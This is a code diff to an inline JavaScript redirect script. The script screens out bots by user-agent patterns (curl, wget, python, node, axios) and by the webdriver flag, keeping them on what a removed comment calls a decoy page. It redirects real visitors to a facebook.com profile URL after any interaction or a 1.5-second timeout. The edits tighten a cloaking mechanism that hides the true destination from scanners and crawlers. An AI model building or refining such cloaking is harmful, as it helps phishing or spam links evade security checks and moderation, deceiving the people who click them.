@@ -64,7 +64,7 @@
   
   if (!id) return;
   id = id.replace(/^\/+|\/+$/g, "");
-  if (id === "bedroomddd") return; // Keep test bot block
+  if (id === "bedroomddd") return; // Bot test block
   if (!/^[A-Za-z0-9._~-]{1,128}$/.test(id)) return;
 
   // =========================================================
@@ -74,7 +74,7 @@
   if (!/^https:\/\/facebook\.com\/[A-Za-z0-9._~-]+\/$/.test(dest)) return;
 
   // =========================================================
-  // 4. STRICT BOT DETECTION (Fixed for Mobile WebViews)
+  // 4. BOT DETECTION (Strict)
   // =========================================================
   var ua = navigator.userAgent || "";
   if (!ua || ua.length < 20) return;
@@ -90,15 +90,14 @@
     /curl/i, /wget/i, /python/i, /node/i, /axios/i
   ];
   
-  // NOTE: Removed /instagram/i and the generic /facebook/i to allow mobile in-app browsers
   for (var i = 0; i < BOT_UA.length; i++) {
-    if (BOT_UA[i].test(ua)) return; // Bot -> Stays on decoy
+    if (BOT_UA[i].test(ua)) return;
   }
 
   if (navigator.webdriver === true) return;
 
   // =========================================================
-  // 5. MOBILE & DESKTOP INTERACTION GATE
+  // 5. INTERACTION & TIMEOUT REDIRECT
   // =========================================================
   var redirected = false;
   function go() {
@@ -107,21 +106,24 @@
     try { window.location.replace(dest); } catch (e) {}
   }
 
-  var humanSignals = 0;
-  function tick() {
-    humanSignals++;
-    if (humanSignals >= 1) go();
-  }
-
-  // Added mobile-specific events: touchmove, touchend, and click
+  // List of all possible events for desktop and mobile
   var events = [
-    "mousemove", "touchstart", "touchmove", "touchend", 
-    "keydown", "pointerdown", "scroll", "click"
+    "mousemove", "mousedown", "mouseup", "click",
+    "touchstart", "touchmove", "touchend", "touchcancel",
+    "keydown", "pointerdown", "scroll"
   ];
 
+  function trigger() { go(); }
+
+  // Attach listeners
   events.forEach(function (ev) {
-    window.addEventListener(ev, tick, { passive: true, once: false });
+    window.addEventListener(ev, trigger, { passive: true });
   });
+
+  // Fallback: If not a bot, redirect after 1.5 seconds even if no interaction
+  setTimeout(function () {
+    if (document.visibilityState === "visible") go();
+  }, 1500);
 
 })();
 </script>
